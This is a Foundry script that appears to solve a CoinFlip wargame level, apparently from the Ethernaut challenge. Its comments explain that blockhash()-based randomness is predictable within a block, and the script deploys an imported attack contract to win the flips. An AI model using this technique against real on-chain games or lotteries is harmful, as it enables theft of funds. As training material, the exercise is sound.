//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/*
SOLUTION OBJECTIVES:
- Predict the correct outcome of the coin flip
- Call the flip() function with the correct guess
*/

/* SOLUTION:
-Using an attack contract, we can predict the outcome of the coin flip
-The attack contract is deployed and the flip() function is called with the correct guess
-This works because the blockhash() function is not a secure source of randomness
-Both the transactions are sent in the same block, so the blockhash() function will return the same value for both transactions
*/

import "../src/CoinFlipAttack.sol";

contract CoinFlip_solution is Script {
    CoinFlip public coinFlipInstance =
        CoinFlip(0x20f8d38A8931F2a314752b737c79bACDC01cA45A);

    function run() external {
        string memory mnemonic = vm.envString("MY_PRIVATE_KEY");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 0);
        vm.startBroadcast(deployerPrivateKey);

        CoinFlipAttack attacker = new CoinFlipAttack(address(coinFlipInstance));
        console.log("Attacker deployed at:", address(attacker));

        attacker.attack();
        console.log(
            "Attack performed. Consecutive wins:",
            coinFlipInstance.consecutiveWins()
        );

        vm.stopBroadcast();
    }
}
